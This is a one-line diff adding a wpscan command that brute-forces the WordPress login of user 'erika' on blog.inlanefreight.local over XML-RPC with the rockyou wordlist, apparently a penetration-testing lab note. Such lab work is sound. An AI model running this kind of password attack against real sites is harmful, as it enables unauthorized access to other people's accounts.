@@ -1,0 +1,1 @@
+wpscan --password-attack xmlrpc -t 50 -U erika -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
